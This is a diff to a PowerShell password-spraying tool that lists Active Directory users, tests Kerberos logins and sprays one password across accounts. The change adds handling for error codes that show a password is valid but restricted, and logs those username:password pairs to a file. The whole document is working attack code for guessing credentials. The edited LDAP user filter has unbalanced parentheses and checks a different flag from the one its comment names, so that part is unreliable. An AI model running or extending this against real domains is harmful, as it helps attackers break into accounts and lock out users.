@@ -431,7 +431,7 @@ function Get-DomainUserList
         # uac 0x10 is LOCKOUT
         # See http://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/
         $UserSearcher.filter =
-            "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)$Filter)"
+            "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=65536)(!userAccountControl:1.2.840.113556.1.4.803:=2)$Filter)"
     }
     else
     {
@@ -541,8 +541,11 @@ function Test-KerberosCredential {
         $status = switch ($errorCode) {
             1326 { "INVALID PASSWORD" }
             1327 { "USER NOT FOUND" }
+            1328 { "INVALID LOGON HOURS" }
+            1329 { "INVALID WORKSTATION" }
+            1330 { "PASSWORD EXPIRED"}
+            1907 { "PASSWORD MUST CHANGE" }
             1909 { "ACCOUNT LOCKED" }
-            1330 { "PASSWORD EXPIRED" }
             default { "ERROR $errorCode" }
         }
         return [pscustomobject]@{
@@ -613,6 +616,27 @@ function Invoke-SpraySinglePassword
                     Write-Host -ForegroundColor Cyan "[!] PASSWORD EXPIRED: $($result.Domain)\$($result.Username)"
                     if ($OutFile -ne "") {
                         Add-Content $OutFile "$($result.Username):$($result.Password) # PASSWORD EXPIRED"
+                    }
+                }
+
+                "PASSWORD MUST CHANGE" {
+                    Write-Host -ForegroundColor Cyan "[!] PASSWORD MUST CHANGE: $($result.Domain)\$($result.Username)"
+                    if ($OutFile -ne "") {
+                        Add-Content $OutFile "$($result.Username):$($result.Password) # PASSWORD MUST CHANGE"
+                    }
+                }
+
+                "INVALID LOGON HOURS" {
+                    Write-Host -ForegroundColor Cyan "[!] INVALID LOGON HOURS: $($result.Domain)\$($result.Username)"
+                    if ($OutFile -ne "") {
+                        Add-Content $OutFile "$($result.Username):$($result.Password) # INVALID LOGON HOURS"
+                    }
+                }
+
+                "INVALID WORKSTATION" {
+                    Write-Host -ForegroundColor Cyan "[!] INVALID WORKSTATION: $($result.Domain)\$($result.Username)"
+                    if ($OutFile -ne "") {
+                        Add-Content $OutFile "$($result.Username):$($result.Password) # INVALID WORKSTATION"
                     }
                 }
 
